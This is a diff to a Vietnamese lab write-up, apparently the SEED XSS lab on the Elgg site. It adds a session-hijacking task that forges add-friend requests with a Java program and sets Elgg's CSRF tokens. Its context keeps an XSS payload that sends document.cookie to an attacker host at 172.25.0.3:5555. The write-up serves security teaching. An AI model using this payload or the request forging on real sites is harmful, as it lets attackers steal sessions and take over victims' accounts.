@@ -56,3 +56,26 @@
   <script>document.write('<img src=http://172.25.0.3:5555?c='+ escape(document.cookie) + '>');</script>
   ```
   ![image](https://github.com/user-attachments/assets/ea46dd42-2e13-4dd7-b08a-d141b6aa85a1)
+
+## Task 4: Session Hijacking sử dụng cookie bị đánh cắp
+- Sau khi đánh cắp cookie của nạn nhân, kẻ tấn công có thể làm bất cứ điều gì nạn nhân có thể làm với web Elgg, bao gồm thêm và xóa bạn bè của nạn nhân. Trong nhiệm vụ này, chúng tôi sẽ khởi chạy cuộc tấn công chiếm quyền điều khiển session.
+
+- Để thêm một người bạn cho nạn nhân, chúng ta sẽ tìm hiểu cách một người dùng hợp pháp thêm một người bạn trong Elgg. Chúng ta cần tìm những gì có trong request gửi đến máy chủ khi người dùng thêm một người bạn. Web Developer / Network tool sẽ cho chúng ta biết những request từ trình duyệt gửi đến máy chủ. Từ nội dung, chúng tôi có thể xác định được tất cả các tham số trong request. 
+- Máy chủ Elgg không thể phân biệt xem yêu cầu có phải được gửi bởi trình duyệt nạn nhân hoặc bởi chương trình Java của kẻ tấn công. Miễn sao trong request của kẻ tấn công có đầy đủ tham số như sesion cookie. Để đơn giản hóa nhiệm vụ, thư mục HTTPSimpleForge trên máy tính của kẻ tấn công chứa một mẫu chương trình Java thực hiện. 
+    - Note 1: Elgg sử dụng hai tham số __elgg_ts và __elgg_token là biện pháp đối phó CSRF(Cross Site Request Forgery). Đảm bảo rằng bạn đặt các tham số này chính xác cho cuộc tấn công của mình để thành công. 
+    - Note 2: Compile và run chương trình Java:
+      - javac HTTPSimpleForge.java
+      - java HTTPSimpleForge
+- Kiểm tra request kết bạn
+  
+![image](https://github.com/user-attachments/assets/01081210-1a14-4e0b-85de-9fcf42b0c5de)
+  
+![image](https://github.com/user-attachments/assets/1d9b8546-7ee5-4427-9a41-a70a0a87ca33)
+
+![image](https://github.com/user-attachments/assets/f63e7e71-79ec-4036-bf13-40bd52c2d932)
+
+## Checkwork
+
+![image](https://github.com/user-attachments/assets/404d4fb6-bd62-4ded-8805-c4112480d8fc)
+
+![image](https://github.com/user-attachments/assets/6bd61dfa-3264-4b76-9b76-04376e383bac)
